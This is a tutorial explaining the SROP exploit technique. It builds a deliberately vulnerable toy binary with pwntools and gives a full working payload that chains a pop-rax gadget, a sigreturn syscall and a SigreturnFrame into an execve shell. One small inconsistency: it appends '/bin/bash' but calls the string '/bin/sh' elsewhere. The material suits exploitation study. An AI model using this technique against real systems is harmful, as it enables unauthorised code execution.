# SROP (Sigreturn-Oriented Programming) Exploit Technique

The **SROP (Sigreturn-Oriented Programming)** technique is used to control the CPU registers using a **sigreturn** system call (`syscall 0xf`), allowing for greater control when traditional **ROP** gadgets aren't sufficient. This is particularly useful when dealing with situations where gadgets to directly pop registers (like `pop rdi; ret`) are unavailable.

SROP works by leveraging the **sigreturn** system call, which is used to return from signal handlers. The registers must be populated in a specific order on the stack for **sigreturn** to execute, and **SigreturnFrame** can help manage this order.

## Step-by-Step Explanation

### 1. Creating the Vulnerable Binary
The vulnerable binary is created using **pwntools**' `ELF.from_assembly()` function. In this case, the binary contains a **read syscall** followed by a **pop rax; ret** gadget.

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

elf = ELF.from_assembly(
    '''
        mov rdi, 0;
        mov rsi, rsp;
        sub rsi, 8;
        mov rdx, 500;
        syscall;
        ret;
        
        pop rax;
        ret;
    ''', vma=0x41000
)
elf.save('vuln')
```

### 2. Adding "/bin/bash" to the Binary
You can then add the `/bin/bash` string to the binary:

```bash
echo -en "/bin/bash\x00" >> vuln
```

### 3. Gadget Locations and Exploitation
Now, let's identify the locations of the **gadgets** and **/bin/sh** string within the binary.

```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250  # Location of /bin/sh
POP_RAX = 0x41018  # Gadget to pop rax
SYSCALL_RET = 0x41015  # Gadget to return to syscall
```

### 4. Triggering the Sigreturn
To use **sigreturn**, you need to set the **RAX** register to `0xf` (the syscall number for sigreturn) and then call the **syscall** instruction.

```python
payload = b'A' * 8  # Padding to overflow RIP
payload += p64(POP_RAX)  # Set RAX to 0xf (sigreturn)
payload += p64(0xf)  # Syscall number for sigreturn
payload += p64(SYSCALL_RET)  # Return to syscall
```

### 5. Creating the Sigreturn Frame
To fill the registers in the correct order, we use **SigreturnFrame**, a utility provided by **pwntools** that arranges the registers for **sigreturn**. Here, we configure the registers for an **execve** syscall.

```python
frame = SigreturnFrame()
frame.rax = 0x3b  # Syscall number for execve
frame.rdi = BINSH  # Pointer to /bin/sh
frame.rsi = 0x0  # NULL (no arguments)
frame.rdx = 0x0  # NULL (no environment)
frame.rip = SYSCALL_RET  # Point to the syscall gadget
```

### 6. Final Exploit
We now combine everything into the final payload and send it to the process. The **SigreturnFrame** ensures the registers are in the correct order for **execve** to execute and spawn a shell.

```python
payload = b'A' * 8  # Padding to overflow RIP
payload += p64(POP_RAX)  # Set RAX to 0xf (sigreturn)
payload += p64(0xf)  # Syscall number for sigreturn
payload += p64(SYSCALL_RET)  # Return to syscall
payload += bytes(frame)  # Add the sigreturn frame with register values

p.sendline(payload)
p.interactive()  # Get interactive shell
```

### 7. Explanation of Final Payload
- **Padding (`'A' * 8`)**: This is used to overwrite the return address in the stack.
- **POP_RAX**: This gadget sets **RAX** to `0xf`, which corresponds to the **sigreturn** syscall.
- **SYSCALL_RET**: This gadget triggers the actual syscall to initiate the sigreturn.
- **SigreturnFrame**: This is the frame that holds the registers for the **execve** syscall. It includes:
  - **RAX** set to `0x3b` (syscall number for `execve`).
  - **RDI** set to the address of **/bin/sh**.
  - **RSI and RDX** set to `0`, as **execve** requires these values to be `NULL`.
  - **RIP** set to the address of the **SYSCALL_RET** gadget to ensure the syscall executes.

### Conclusion
This exploit leverages **SROP** to bypass the need for traditional gadgets like `pop rdi`, `pop rsi`, and `pop rdx`, instead using **sigreturn** to control the registers and trigger the **execve** syscall. By controlling the state of the machine via **sigreturn**, we can perform powerful exploits even when there are limited gadgets available.

